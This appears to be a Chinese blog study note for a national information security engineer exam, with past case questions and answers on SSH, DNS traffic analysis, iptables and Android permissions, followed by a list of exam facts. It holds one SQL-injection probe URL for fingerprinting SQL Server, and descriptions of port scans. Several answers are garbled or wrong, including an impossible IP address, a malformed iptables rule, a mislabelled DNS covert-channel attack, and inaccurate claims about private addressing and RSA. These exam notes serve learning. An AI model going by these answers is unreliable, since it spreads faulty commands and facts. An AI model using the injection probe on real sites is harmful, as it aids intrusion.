<p>&#x2F;etc&#x2F;ssh&#x2F;sshd_config</p>
</blockquote>
<p>(2)李工在创建证书后需要拷贝公钥信息到服务器中。他在终端输入了以下拷贝命令，请说明命令中“&gt;&gt;”的含义。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh xiaoming@server <span class="built_in">cat</span>/home/xiaoming/.ssh/id rsa.pub &gt;&gt; authorized keys</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&gt;&gt;表示向文件中进行追加内容</p>
</blockquote>
<p>(3)服务器中的authorized keys文件详细信息如下，请给出文件权限的数字表示。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-rw-------1 root root 0 10月18 2018&#x27;authorized keys</span><br></pre></td></tr></table></figure>

<blockquote>
<p>600</p>
</blockquote>
<p>(4)李工完成SSH配置修改后需要重启服务，请给出systemctl 重启SSH服务的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<p>(5)在上述服务配置过程中，配置命令中可能包含各种敏感信息，因此在配置结束后应及时清除历史命令信息，请给出清除系统历史记录应执行的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure>

<p><a href="2%E5%88%86">问题5</a></p>
<p>SSH之所以可以实现安全的远程访问，归根结底还是密码技术的有效使用。对于SSH协议，不管是李工刚开始使用的基于口令的认证还是后来的基于密钥的免密认证，都是密码算法和密码协议在为李工的远程访问保驾护航。请问上述安全能力是基于对称密码体制还是非对称密码体制来实现的?</p>
<blockquote>
<p>非对称密码体制</p>
</blockquote>
<h2 id="16-2021年试题三"><a href="#16-2021年试题三" class="headerlink" title="16-2021年试题三"></a>16-2021年试题三</h2><p>试题三(共20分)<br>阅读下列说明和图，回答问题1至问题5,将解答填入答题纸的对应栏内。<br>【说明】<br>域名系统是网络空间的中枢神经系统，其安全性影响范围大，也是网络攻防的重点。李工在日常的流量监控中，发现以下可疑流量，请协助分析其中可能的安全事件。</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%9016-1.png" alt="案例分析16-1"></p>
<p><a href="4%E5%88%86">问题1</a><br>域名系统采用授权的分布式数据查询系统，完成域名和!P地址的解析。李工通过上述流量可以判断域名解析是否正常、有无域名劫持攻击等安全事件发生。<br>(1)域名系统的服务端程序工作在网络的哪一层?</p>
<blockquote>
<p>应用层</p>
</blockquote>
<p>(2)图3-1中的第一个网络分组要解析的域名是什么?</p>
<blockquote>
<p><a href="http://www.humen.com/">www.humen.com</a></p>
</blockquote>
<p>(3)给出上述域名在DNS查询包中的表示形式(16进制)。</p>
<blockquote>
<p>77,77,77,05,68,75,6D,65,6E,03,63,6F,6D</p>
</blockquote>
<p>(4)由图3-1可知李工所在单位的域名服务器的IP地址是什么?</p>
<blockquote>
<p>192.168.299.133</p>
</blockquote>
<p><a href="2%E5%88%86">问题2</a><br>签于上述DNS协议分组包含大量奇怪的子域名，如想知道是哪个应用程序发送的上述网络分组，请问在Windows系统下，李工应执行哪条命令以确定上述DNS流量来源?</p>
<blockquote>
<p>netstat -b</p>
</blockquote>
<p><a href="6%E5%88%86">问题3</a></p>
<p>通过上述的初步判断，李工认为192.168,229.1的计算机可能已经被黑客所控制(CC攻击)。黑客惯用的手法就是建立网络隐蔽通道，也就是指利用网络协议的某些字段秘密传输信息，以掩盖恶意程序的通信内容和通信状态。<br>(1)请问上述流量最有可能对应的恶意程序类型是什么?</p>
<blockquote>
<p>DOS攻击</p>
</blockquote>
<p>(2)上述流量中隐藏的异常行为是什么?请简要说明。</p>
<blockquote>
<p>发送大量无效的DNS请求攻击DNS服务器，导致基于此DNS服务器解析应用不能正常工作</p>
</blockquote>
<p>(3)信息安全目标包括保密性、完整性、不可否认性、可用性和可控性，请问上述流量所对应的网络攻击违反了信息安全的哪个目标?</p>
<blockquote>
<p>可用性和可控性</p>
</blockquote>
<p><a href="6%E5%88%86">问题4</a><br>通过上述的攻击流分析，李工决定用防火墙隔离该计算机，李工所运维的防火墙是Ubuntu 系统自带的iptables防火墙。<br>(1)请问iptables默认实现数据包过滤的表是什么?该表默认包含哪几条链?</p>
<blockquote>
<p>Filter表，包含了input，output，forward三条链。</p>
</blockquote>
<p>(2)李工首先要在ipables防火墙中查看现有的过滤规则，请给出该命令。</p>
<blockquote>
<p>iptables -L</p>
</blockquote>
<p>(3)李工要禁止该计算机继续发送DNS数据包，请给出相应过滤规则。</p>
<blockquote>
<p>iptables -t filter -a input -s 192.168.229.1 –dport 53 -j drop</p>
</blockquote>
<p><a href="2%E5%88%86">问题5</a><br>在完成上述处置以后，李工需要分析事件原因，请说明导致DNS成为CC攻击的首选隐蔽传输通道协议的原因。</p>
<blockquote>
<p>便于隐藏，不易被防火墙和基于http协议的拦截工具拦截</p>
</blockquote>
<h2 id="17-2021年试题四"><a href="#17-2021年试题四" class="headerlink" title="17-2021年试题四"></a>17-2021年试题四</h2><p>试题四(共15分)<br>阅读下列说明和图，回答问题1至问题4,将解答填入答题纸的对应栏内，<br>【说明】<br>近期，按照网络安全审查工作安排，国家网信办会同公安部、国家安全部、自然资源部、交通运输部、税务总局、市场监管总局等部门联合进驻某出行科技有限公司，开展网络安全审查，移动App安全检测和个人数据安全再次成为关注焦点</p>
<p><a href="4%E5%88%86">问题1</a></p>
<p>为保护 Android 系统及应用终端平台安全，Android 系统在内核层、系统运行层、应用框架层以及应用程序层采取了相应的安全措施，以尽可能地保护移动用户数据、应用程序和设备安全。<br>在Android 系统提供的安全措施中有安全沙箱、应用程序名机制、权限声明机制、地址空间布局随机化等，请将上述四种安全措施按照其所在层次分填入表4-1的空(1)~(4)。<br>表4-1 Android系统安全系统结构</p>
<table>
<thead>
<tr>
<th>应用程序层</th>
<th>（1）权限声明机制</th>
</tr>
</thead>
<tbody><tr>
<td><strong>应用框架层</strong></td>
<td><strong>（2）营运程序明机制</strong></td>
</tr>
<tr>
<td><strong>系统运行程序层</strong></td>
<td><strong>（3）安全沙箱</strong></td>
</tr>
<tr>
<td><strong>内核层</strong></td>
<td><strong>（4）地址空间布局随机</strong></td>
</tr>
</tbody></table>
<p><a href="6%E5%88%86">问题2</a></p>
<p>权限声明机制为操作权限和对象之间设定了一些限制，只有把权限和对象达行绑定，才可以有权操作对象</p>
<p>(1)请问Android系统应用程序权限信息声明都在哪个配置文件中?给出该配置文件名。</p>
<blockquote>
<p>Manifest.xml</p>
</blockquote>
<p>(2)Android系统定义的权限组包括CALENDAR、CAMERA、CONTACTS、LOCATION、MICROPHONE、PHONE、SENSORS.SMS、STORAGE。按照《信息安全技术 移动互联网应用程序(App)收集个人信息基本规范》，运行在Android9.0系统中提供网络约车服务的某某出行App可以有的最小必要权限是以上权限组的哪几个?</p>
<blockquote>
<p>microphone</p>
<p>SMS</p>
<p>location</p>
<p>phone</p>
<p>storage</p>
</blockquote>
<p>(3)假如有移动应用A提供了如下服务 AService，对应的权限描述如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;permission</span><br><span class="line">	android:name=<span class="string">&quot;USER INFO&quot;</span></span><br><span class="line">	android:label=<span class="string">&quot;read user information&quot;</span></span><br><span class="line">	android:description=<span class="string">&quot;get user information&quot;</span></span><br><span class="line">	android:ProtectionLevel=<span class="string">&quot;signature&quot;</span></span><br><span class="line">/&gt;</span><br><span class="line">&lt;service android:name=<span class="string">&quot;com.demo.AService&quot;</span></span><br><span class="line">	android:exported=<span class="string">&quot;true&quot;</span></span><br><span class="line">	android:permission=<span class="string">&quot;com.demo.permission.USER_INFO&quot;</span></span><br><span class="line">&lt;/serVice&gt;</span><br></pre></td></tr></table></figure>

<p>如果其它应用B要访问该服务，应该申明使用该服务，将以下申明语句补充完整。</p>
<p>1.&lt;				android : name &#x3D; “com.demo.ASeryice”&#x2F;&gt;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;service android:name = <span class="string">&quot;com.demo.ASerryice&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>【说明】当一个应用要使用服务时，必须在应用的清单文件中声明所有的服务。必须添加sercive元素作为application元素作为子元素。例如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manifest...</span><br><span class="line">...</span><br><span class="line">applicationn ...</span><br><span class="line">service andrrod:name=.ExampleService /</span><br><span class="line">...</span><br><span class="line">/application</span><br><span class="line">/manifest</span><br></pre></td></tr></table></figure>


</blockquote>
<p><a href="3%E5%88%86">问题3</a><br>应用程序框架层集中了很多Android开发需要的组件，其中最主要的就是Activities、Broadcast Receiver Services以及Content Providers这四大组件，围绕四大组件存在很多的攻击方法，请说明以下三种攻击分别是针对哪个组件。<br>(1)目录遍历攻击:    Content Providers<br>(2)界面劫持攻击: 	Acticities<br>(3)短信拦截攻击: 	Brodcast Receiver Services</p>
<p><a href="2%E5%88%86">问题4</a><br>移动终端设备常见的数据存储方式包括:<br>①SharedPreferences;<br>②文件存储;<br>③SQLite数据库:<br>④ContentProvider:<br>⑤网络存储。<br>从以上5种方式中选出Android系统支持的数据方式，给出对应存储方式的编号。</p>
<blockquote>
<p>①②③④⑤</p>
</blockquote>
<h2 id="18-2017年试题一"><a href="#18-2017年试题一" class="headerlink" title="18-2017年试题一"></a>18-2017年试题一</h2><p>阅读下列说明，回答问题1至问题3，将解答写在答题纸的对应栏内。</p>
<p>【说明】<br>安全目标的关键是实现安全的三大要素:机密性、完整性和可用性。对于一般性的信息类型的安全分类有以下表达形式:{(机密性，影响等级)，(完整性，影响等级)，(可用性，影响等级)}在上述表达式中，”影响等级”的值可以取为低(L)、中(M)、高(H)三级以及不适用(NA)。<br><a href="6%E5%88%86">问题1</a><br>请简要说明机密性、完整性和可用性的含义。</p>
<blockquote>
<p>机密性：确保信息仅被合法用户访问，而不被泄露给非授权用户</p>
<p>完整性：所有资源只能由授权方或以授权的方式进行修改，即信息未授权不可进行改变。</p>
<p>可用性：所有资源在适当的时候可以由授权方访问，信息可悲授权实体访问并按需求使用。</p>
</blockquote>
<p><a href="6%E5%88%86">问题2</a><br>对于影响等级”不适用”通常只针对哪个安全要素?</p>
<blockquote>
<p>机密性</p>
</blockquote>
<p><a href="3%E5%88%86">问题3</a><br>如果一个普通人在它的个人Web服务器上管理其公开信息。请问这种公开信息的安全分类是什么?</p>
<blockquote>
<p>{(机密性：NA)，(完整性：M),(可用性：M)}</p>
</blockquote>
<h1 id="知识汇集"><a href="#知识汇集" class="headerlink" title="知识汇集"></a>知识汇集</h1><h2 id="信息安全基础知识"><a href="#信息安全基础知识" class="headerlink" title="信息安全基础知识"></a>信息安全基础知识</h2><ol>
<li><p>访问控制机制由组成要素主要有：<strong>主体</strong>(Subject) 、<strong>参考监视器</strong>(Reference Monitor) 、<strong>客体</strong>(Object) 、<strong>访问控制数据库</strong>、<strong>审计库</strong>。</p>
<blockquote>
<ul>
<li>主体是客体的操作实施者。实体通常是人、进程或设备等，一般是代表用户执行操作的进程。比如编辑一个文件，编辑进程是存取文件的主体，而文件则是客体。</li>
<li>客体是被主体操作的对象。</li>
<li>参考监视器是访问控制的决策单元和执行单元的集合体。</li>
<li>记录主体访问客体的权限及其访问方式的信息，提供访问控制决策判断的依据，也称为访<br>问控制策略库。</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B.png" alt="访问控制参考模型"></p>
</li>
<li><p>自主访问控制模型、强制访问控制模型、基于角色的访问控制模型常用于操作系统、数据库系统的资源访问。</p>
</li>
<li><p>基于使用的访问控制模型则用于隐私保护、敏感信息安全限制、知识产权保护；</p>
</li>
<li><p>基于地理位置的访问控制模型可用于移动互联网应用授权控制，如打车服务中的地理位置授权使用；</p>
</li>
<li><p>基于属性的访问控制主要提供分布式网络环境和 Web 服务的模型访问控制；</p>
</li>
<li><p>基于时态的访问控制模型则利用时态作为访问约束条件，增强访问控制细粒度，如手机网络流量包的限时使用。</p>
</li>
<li><p>自主访问控制(DAC)：</p>
<blockquote>
<p>基于行的自主访问控制【能力表(capability list) ，前缀表(capability list) ，口令(password)】</p>
</blockquote>
<blockquote>
<p>基于列的自主访问控制【保护位(protection bits)、访问控制表(Access Control List, **ACL)**】</p>
</blockquote>
<blockquote>
<p>HRU模型</p>
</blockquote>
</li>
<li><p>强制访问控制 (Mandatory Access Control, MAC) </p>
<blockquote>
<ul>
<li>BLP 机密性模型：下读、上写</li>
<li>BiBa 完整性模型：上读、下写</li>
<li>BN 模型 (Chinese Wall模型)</li>
</ul>
</blockquote>
</li>
<li><p>基于角色的访问控制模型（RBAC）</p>
</li>
<li><p>基于属性的访问控制模型（ABAC）</p>
</li>
<li><p>特权（Privilege）是用户超越系统访问控制所拥有的权限。有利于系统维护和配置，但不利于系统安全性。</p>
</li>
<li><p>最小特权原则是系统中每一个主体只能拥有完成任务所必须的权限集，阻止特权乱用。</p>
</li>
<li><p>特权的分配原则是“按需使用”。</p>
</li>
<li><p>网络安全专用产品有：数据备份一体机、防火墙（硬件）、WEB应用防火墙（WAF）、入侵检测系统（IDS）、入侵防御系统（IPS）、安全隔离与信息交换产品（网闸）、反垃圾邮件产品、网络中和审计系统、网路脆弱性扫描产品、安全数据库系统、网络恢复产品（硬件）。</p>
</li>
<li><p>入侵检测系统IDS帮助管理员快速发现网络攻击。</p>
</li>
<li><p>分组密码常用的工作模式：</p>
<blockquote>
<ul>
<li>电码本模式（ECB模式）</li>
<li>密码反馈模式（CFB模式）</li>
<li>密码分组链接模式（CBC模式）</li>
<li>输出反馈模式（OFB模式）</li>
</ul>
</blockquote>
</li>
<li><p>结构化保护的计算机信息系统可信计算基建立于一个明确定义的形式化安全策略模型之上，还要考虑隐蔽通道。</p>
</li>
<li><p>攻击树模型起源于故障树模型。使用AND-OR两类节点。</p>
</li>
<li><p>网络信息安全防御是指采取各种手段和措施，使得网路系统具备阻止、<strong>抵御</strong>各种已知的网络安全威胁的功能。</p>
</li>
<li><p>网络信息安全应急是指采取各种手段和措施，针对网络系统中的<strong>突发事件</strong>，具有及时响应和处置网络攻击的能力。</p>
</li>
<li><p>由于网络管理对象自身的脆弱性，使得威胁的发生成为可能，从而造成了不同的影响，形成了风险。</p>
</li>
<li><p>脆弱性指计算机系统和中与安全策略想相冲突的状态或错误，它将导致攻击者非授权访问、假冒用户执行操作及拒绝服务。</p>
</li>
<li><p>网络风险&#x3D;网络威胁发生的概率X所造成的影响</p>
</li>
<li><p><strong>避免风险：</strong>通过物理隔离设备将内部网和外部网分开，避免受到外部网的攻击。</p>
</li>
<li><p><strong>转移风险：</strong>购买商业保险计划或安全外包。</p>
</li>
<li><p><strong>减少威胁：</strong>安装防病毒软件包，防止病毒攻击。</p>
</li>
<li><p><strong>消除脆弱点：</strong>给操作系统打补丁或强化工作人员的安全意识。</p>
</li>
<li><p><strong>减少威胁的影响：</strong>采取多条通讯线路进行备份或定制应急预案。</p>
</li>
<li><p><strong>风险监测：</strong>定期对网络系统中的安全状况进行风险分析，监测潜在的威胁行为。</p>
</li>
<li><p>保护措施是指 对付网络安全威胁，减少脆弱性，限制意外事件的影响，检测意外事件并促进灾难 恢复而实施的各种实践、规程和机制的总称。其目的是对网络管理对象进行<strong>风险控制</strong>。</p>
</li>
<li><p>《中华人民共和国个人信息保护法》自2021年11月1日起实施。</p>
</li>
<li><p>USENIX Security被中国计算机学会（CCF）归为“网络与信息安全”A类会议分（共分A,B,C三类，A类最佳）</p>
</li>
<li><p>用户的安全大于或等于信息的安全级并且用户的访问范畴包含信息范畴时，用户可合法读取该信息。</p>
</li>
<li><p>PDRR[Protection,Detection,Recovery,Respons]</p>
<blockquote>
<p>保护：加密机制、数据签名机制、访问控制机制、认证机制、信息隐藏、防火墙技术等。</p>
<p>检测：入侵检测、系统脆弱性检测、数据完整性检测、攻击性检测等。</p>
<p>恢复：数据备份、数据修复、系统恢复等。</p>
<p>响应：应急策略、应急机制、应急手段、入侵过程分析、安全状态评估等。</p>
</blockquote>
</li>
<li><p>在人员安全的工作安全方面，应遵守多人负责原则，任期有限原则，职责分离原则。</p>
</li>
<li><p>信息安全等级保护测评：</p>
<blockquote>
<ol>
<li>用户自主保护级</li>
<li>系统保护审计级</li>
<li>安全标记保护级</li>
<li>结构化保护级</li>
<li>访问验证保护级</li>
</ol>
</blockquote>
</li>
<li><p>软件安全能力成熟度模型分成五级</p>
<blockquote>
<p>CMMI级–补丁修补;</p>
<p>CMM2级–渗透测试、安安全代码评审;</p>
<p>CMM3级–漏洞评估、代码分析、安全编码标准;</p>
<p>CMM4级–软件安全风险识别、SDLC实施不同安全检查点;</p>
<p>CMM5级–改进软件安全风险覆盖率、评估安全差距。</p>
</blockquote>
</li>
<li><p>共识算法主要应用于区块链，验证交易的合法性和正确这一部分，从而保持了各个节点的交易和区块数据的一致性。</p>
</li>
<li><p>FIN扫描：源主机A向目标主机B发送FIN数据包（<strong>断开连接请求</strong>），然后查看反馈信息，</p>
<blockquote>
<p>如果返回RESET信息，则端口关闭</p>
</blockquote>
<blockquote>
<p>如果没有消息返回，则端口开放</p>
</blockquote>
</li>
<li><p>半连接扫描：在源主机和目的主机的<strong>三次握手连接过程中，只完成前两次</strong>，不建立一次完整连接的扫描；</p>
</li>
<li><p>SYN扫描：首先向目标主机发送连接请求，当目标主机返回响应后，立即切断连接过程并查看响应情况。</p>
<blockquote>
<p>如果返回ACK信息，表明端口开放</p>
</blockquote>
<blockquote>
<p>如果返回RESET信息，表明端口未开放</p>
</blockquote>
</li>
<li><p>完全连接扫描：完全连接扫描利用TCP协议的三次握手连接机制，建立一次完整的连接。</p>
<blockquote>
<p>如果连接成功，表明端口开放</p>
</blockquote>
<blockquote>
<p>未连接成功，表明端口未开放</p>
</blockquote>
</li>
<li><p>私钥密码体制（对称密码体制）：</p>
<blockquote>
<p>缺点：密钥分配问题，密钥管理问题，无法认证源，加密强度不高</p>
</blockquote>
<blockquote>
<p>优点：使用大量的数据加密处理</p>
</blockquote>
</li>
<li><p>公钥密码体制（非对称密码体制）：</p>
<blockquote>
<p>缺点：加密效率低、速度慢、算法复杂</p>
</blockquote>
<blockquote>
<p> 优点：密钥分发方便、密钥保管量少，支持数字认证，少量数据加密</p>
</blockquote>
</li>
<li><p>数字证书通过CA的私钥进行签名，其真伪及有效性通过CA的公钥来验证。</p>
</li>
<li><p>Diffie-Hellman密钥交换协议基于求解离散对数的困难性</p>
</li>
<li><p>RSA基于大整数因子分解的困难性</p>
</li>
<li><p>数据中心IDC机房的R1[99.5%] , R2[99.9%] , R3[99.99%]；</p>
</li>
<li><p>数据中心IDC耐火等级不低于二级</p>
</li>
<li><p>在政府部门、军事和金融等高级安全要求领域，常要求利用 <strong>强制访问控制</strong> 将系统的资源划分安全等级和恶不同类别，然后进行安全管理。</p>
</li>
<li><p>防火前截取内网主机和外网通信，由防火墙本省完成与外网主机通信，然后把结果传回给内网主机，这种技术称为 <strong>透明代理</strong></p>
</li>
<li><p>Web应用防火墙无法防御 <strong>Smurf攻击</strong></p>
</li>
<li><p>VPN分为 数据链路层VPN（PPTP , L2TP），网络层VPN （IPSec），传输层VPN（SSL）</p>
</li>
<li><p>IPSec拥有两种工作模式：<strong>透明模式</strong> 和 <strong>隧道模式</strong> </p>
<blockquote>
<p>透明模式：只保护IP包中的数据域</p>
<p>隧道模式：保护IP包中的包头和数据域</p>
</blockquote>
</li>
<li><p>SSL：包含握手协议、密码规格变更协议、报警协议、记录层协议。</p>
<blockquote>
<p>握手协议：用于身份鉴别和安全参数协商</p>
<p>密码规格变更协议：通知安全参数的变更</p>
<p>报警协议：关闭通知和对错误进行报警</p>
<p>记录层协议：传输数据的分段、压缩及解压缩、加密及解密 、完整性校验</p>
</blockquote>
</li>
<li><p>基于网络的入侵检测系统（NIDS）不能检测出的入侵行为：<strong>远程口令破解</strong></p>
</li>
<li><p>入侵检测系统：基于主机的入侵检测系统（HIDS)、基于网络的入侵检测系统（NIDS)、分布式入侵检测系统（DIDS）。</p>
</li>
<li><p>字符会话审计主要审计SSH、Telnet等协议</p>
</li>
<li><p>逻辑炸弹是一段依附在其他软件中，并具有触发执行破坏能力的程序代码</p>
</li>
<li><p>陷门是软件系统的一段代码，允许用户避开系统安全机制而访问系统</p>
</li>
<li><p>细菌是指具有自我复制功能的独立程序。虽然细菌不会直接攻击任何软件，但它通过复制本体来消耗系统资源。</p>
</li>
<li><p>间谍软件通常指在用户不知情的情况下被安装在计算机中的各种软件，并执行用户非期望的功能。</p>
</li>
<li><blockquote>
<p>透明性：加入水印不会降低图像质量，很难发现于原图像的差别。</p>
</blockquote>
<blockquote>
<p>鲁棒性：不会丢失水印，提取水印信息后任然有效。</p>
</blockquote>
<blockquote>
<p>安全性：能抵抗各种攻击后还能唯一标识图像，第三方不能伪造他人带水印的图像。</p>
</blockquote>
</li>
<li><p>电子证据在离开响应技术设备后，往往无法保存和传输，体现电子证据的 <strong>高科技性</strong></p>
</li>
<li><p>在数据库设置后门，绕过数据库系统的安全访问控制机制属于 <strong>旁路控制</strong></p>
<p>隐蔽信道：通常存储在数据库中数据经由合法的数据信道被取</p>
<p>伪装：攻击者假冒用户身份获取数据库系统的访问权限</p>
<p>口令密码破解：利用口令字典或手动猜测数据库用户密码，达到非授权访问数据库</p>
</li>
<li><p>政府网站的信息安全等级原则上不低于二级，政府数据中心安全等级原则上不低于三级。三级网站每年测评一次，二级网站每两年测评一次。</p>
</li>
<li><p>“两地三中心”两地指同城、异地。三中心：生产中心、同城容灾中心、异地容灾中心</p>
</li>
<li><p>NetBIOS和勒索病毒常使用135~139，445端口</p>
</li>
<li><p>IPSec VPN 提供的安全服务有：<strong>完整性服务</strong>、<strong>认证服务</strong>、<strong>保密性服务</strong></p>
</li>
<li><p>2最小化系统网络服务是在满定业务的前提下，尽量关闭不需要的服务和网络端口，在Linux系统中首先是将inetd.conf的文件权限设置为 <strong>600</strong></p>
</li>
<li><p>Apache的access.conf配置文件负责设置文件的访问权限</p>
</li>
<li><p><strong>错误表述</strong>：数字签名是十六进制的字符串</p>
</li>
<li><p>消息认证能够确定接收方收到的消息是否被篡改过</p>
</li>
<li><p>数字签名最常见的实现方法是建立在 <strong>公钥密码体制</strong> 和 <strong>单向安全散列函数算法</strong> 的基础上</p>
</li>
<li><p>计算机取证时首先必须隔离目标计算机系统，不给犯罪嫌疑人破坏证据的机会。对现场计算机的一个处理原则：已经开机的计算机不要关机，关机的计算机不要开机。</p>
</li>
<li><p>注入语句<a href="http://xxx.xxx.xxx/abc.asp?pYY">http://xxx.xxx.xxx/abc.asp?pYY</a>  and user&gt;0 可以判断服务器的后台数据库是否为SQL-SERVER,还可得到 <strong>当前连接数据库的用户名</strong></p>
</li>
<li><p>在访问Internet时，为防止Web页面中恶意代码对自己计算机的损害，可采取的措施是 <strong>将要访问的Web站点按其可信度分配道浏览器的不同安全区域</strong></p>
</li>
<li><p>主要的渗透威胁有 <strong>假冒</strong>，<strong>旁路</strong>，<strong>授权侵犯</strong></p>
</li>
<li><p>主要的植入威胁：<strong>特洛伊木马</strong> 和 <strong>陷阱</strong>。</p>
</li>
<li><p>依据国家信息安全等级保护相关标准，军用不对外公开的信息系统至少应该属于 <strong>三级及三级以上</strong></p>
</li>
<li><p>Kerberos 采用DES加密算法来身份认证</p>
</li>
<li><p>证书通常包含 用户身份信息，持有者的公开密钥，CA的数字签名信息</p>
</li>
<li><p>数字信封能保证数据传输过程中的 <strong>安全性</strong></p>
</li>
<li><p>DES加密算法中，密钥长度和被加密的算法的分组长度为56位和64位，子密钥长度为48位</p>
</li>
<li><p>特洛伊木马攻击的威胁类型属于 <strong>植入威胁</strong></p>
</li>
<li><p>属于专用地址的是10.1.2.3；整个A类都是专用。</p>
</li>
<li><p>风险评估报告属于信息安全风险分析阶段的输出报告</p>
</li>
<li><p>OSI参考模型中的数据链路层 <strong>保证数据正确的顺序、无差错和完整</strong></p>
</li>
<li><p>深度流检测技术主要分三部分： 流特征选择、流特征提取、分类器</p>
</li>
<li><p>差错控制不属于网络安全控制技术</p>
</li>
<li><p>网络安全控制技术：<strong>防火墙技术</strong> <strong>入侵检测技术</strong> <strong>访问控制技术</strong></p>
</li>
<li><p>病毒的引导过程不包含 删除引导扇区</p>
</li>
<li><p>海量数据加密一般不用 <strong>公钥加密(非对称加密)</strong></p>
</li>
<li><p>安全备份的策略不包含 网络服务</p>
</li>
<li><p>SSL位于应用层和传输层中级，可以为任何基于tcp等可靠连接的应用层协议提供安全性保证。</p>
</li>
<li><p>智能卡的片内操作系统（cos)包括：<strong>通讯管理模块</strong>、<strong>安全管理模块</strong>、<strong>文件管理模块</strong>、<strong>应用管理模块</strong>。</p>
</li>
<li><p>cos中对接收命令进行可执行判断属于 <strong>应用管理模块</strong>。</p>
</li>
<li><p>PKI中，CA负责签发证书、管理和撤销证书、证书的审批及备份。</p>
</li>
<li><p>SHA1的输入分组长度为512bit。</p>
</li>
<li><p>AES结构由 <strong>字节代换</strong>、<strong>行移位</strong>、<strong>列混淆</strong>、**轮密钥加密 **</p>
</li>
<li><p>字节代换是非线性模块</p>
</li>
<li><p>求逆元算法：m mod n 的逆元 p &#x3D;&#x3D;&#x3D;》((p*n)-1 )mod n &#x3D;0</p>
</li>
<li><p>《信息技术、安全技术、信息技术安全评估准则》(简称CC)该标准分为三部分，</p>
<ol>
<li>简介和一般模型：附录介绍了”保护轮廓”和”安全目标”</li>
<li>“安全功能要求”：技术要求</li>
<li>“安全保证要求”：定义了评估保证级别</li>
</ol>
</li>
<li><p>避免成为网络中的“单失效点”的原则：<strong>纵深防御原则</strong></p>
</li>
<li><p>完成任务的所必须的最小特权：<strong>最小特权原则</strong></p>
</li>
<li><p>系统不安全程度由最薄弱部分决定：<strong>木桶原则</strong></p>
</li>
<li><p>主体所知道的最小信息分配给主体权力：<strong>最小泄露原则</strong></p>
</li>
<li><p>适合攻击计算机文件系统和数据库系统的是：<strong>选择明文攻击</strong></p>
</li>
<li><p>适合攻击公钥密码体制以及数字签名：<strong>选择密文攻击</strong></p>
</li>
<li><p>认证能有效阻止主动攻击、加密能有效阻止被动攻击</p>
</li>
<li><p>访问控制的任务是授权、不包括审计</p>
</li>
<li><p>网卡有四种通信状态：</p>
<ul>
<li>Unicast(单播)：网卡接收目的的地址为本网卡地址的报文；</li>
<li>Broadcast(广播)：网卡接收广播报文；</li>
<li>Multicast(组播)：网卡接收特定组播报文；</li>
<li>Promiscuous(混杂模式)：网卡接收所有报文。</li>
</ul>
</li>
<li><p>SM1对称加密，分组长度和密钥长度为128位</p>
</li>
<li><p>SM2数字签名算法设计基于256位椭圆曲线公钥密码算法。非对称加密。</p>
</li>
<li><p>SM3杂凑算法，512数据分组长度，杂凑值长度为256位；</p>
</li>
<li><p>SM4分组密码，对称密码，分组长度和密钥长度为128比特。</p>
</li>
<li><p>SM9标识密码算法。</p>
</li>
<li><p>MD5杂凑算法，512数据块产生128位消息摘要（哈希值）。</p>
</li>
<li><p>SHA1杂凑算法，512数据块产生160位哈希值</p>
</li>
<li><p>AES对称加密，分组长度128，密钥长度可以为128，192，256</p>
</li>
<li><p>外部网关协议是在AS之间使用的路由协议，常见的外部网关协议BGP协议。</p>
</li>
<li><p>Sniffer分为软件和硬件两种，软件有NetXray、Netmonitor、Packetboy；硬件Sniffer通常称为协议分析仪。</p>
</li>
<li><p>产生认证码的方式：<strong>报文加密</strong>、消息认证码<strong>MAC</strong>、<strong>基于hash函数的消息认证码(HMAC)</strong></p>
</li>
<li><p>VPN第二层隧道协议L2TP协议主要有LAC和LNS构成。</p>
</li>
<li><p>RSA具有雪崩效应</p>
</li>
<li><p><strong>引入验证码机制</strong>不能有效解决解释攻击的方案</p>
</li>
<li><p>僵尸网络传播的手段：主动攻击漏洞、邮件病毒、即时通信软件、恶意网站脚本、特洛伊木马</p>
</li>
<li><p>非盈利组织域名：org</p>
</li>
<li><p><strong>WEP</strong>为了实现机密性采用RC4加密算法</p>
</li>
<li><p>RA不签发证书。CA发放证书。</p>
</li>
<li><p>BLP模型控制信息只能由低向高流动。</p>
</li>
<li><p>无线传感器网络标准中，Zigbee不属于工业标准</p>
</li>
<li><p>特洛伊木马不属于远程控制型木马。</p>
</li>
<li><p>IRC-Worm不属于漏洞利用类蠕虫。</p>
</li>
<li><p>外部路由器被称为屏蔽子网体系的第一道屏障。</p>
</li>
<li><p>Snort配置有：嗅探、包记录、网络入侵检测。</p>
</li>
<li><p>等保标准中，要求计算机信息系统可信计算基满足访问监视器需求的是：访问验证保护级（第5级）。</p>
</li>
<li><p>等保标准中，要求提供系统恢复机制的是：访问验证保护级（第5级）。</p>
</li>
<li><p>等保标准中，要求对应用程序的所有执行环节进行动态可信验证：第4级。</p>
</li>
<li><p>Wi-Fi加密过程采用TKIP和AES</p>
</li>
<li><p>资产清单包括 <strong>服务</strong> 和 <strong>无形资产</strong> 、<strong>信息资产</strong>、<strong>人员</strong>。</p>
</li>
<li><p>IPSec协议不属于身份认证协议。</p>
</li>
<li><p><strong>容灾与备份技术</strong>不属于网络安全控制技术</p>
</li>
<li><p>密钥协商算法使用 ECDH</p>
</li>
<li><p>震网病毒攻击的是伊朗核电站西门子公司的SIMATIC WinCC系统。</p>
</li>
<li><p>要实现网络信息安全基本目标。网络应具备 <strong>防御</strong>  <strong>监测</strong> <strong>应急</strong> <strong>恢复</strong>等基本功能。</p>
</li>
<li><p>《中华人民共和国个人信息保护法》自2021年11月1日施行。</p>
</li>
<li><p>《中华人民共和国数据安全法》自<strong>2021年9月1日</strong>施行。</p>
</li>
